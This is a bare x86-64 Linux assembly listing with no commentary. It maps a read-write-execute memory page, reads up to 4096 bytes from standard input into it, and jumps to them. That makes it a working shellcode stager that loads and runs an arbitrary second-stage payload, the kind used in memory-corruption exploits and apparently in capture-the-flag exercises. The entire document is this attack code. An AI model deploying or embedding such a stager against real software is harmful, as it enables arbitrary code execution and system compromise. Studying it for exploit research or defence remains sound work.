        .intel_syntax noprefix
        .globl _start
_start:
        xor r9, r9
        push -1
        pop r8
        push 0x22
        pop r10
        push 7
        pop rdx
        lea rsi, [r9+1]
        shl rsi, 12
        xor rdi, rdi
        push 9
        pop rax
        syscall
        xchg rsi, rax
        xchg rdx, rax
        xor rax, rax
        syscall
        jmp rsi
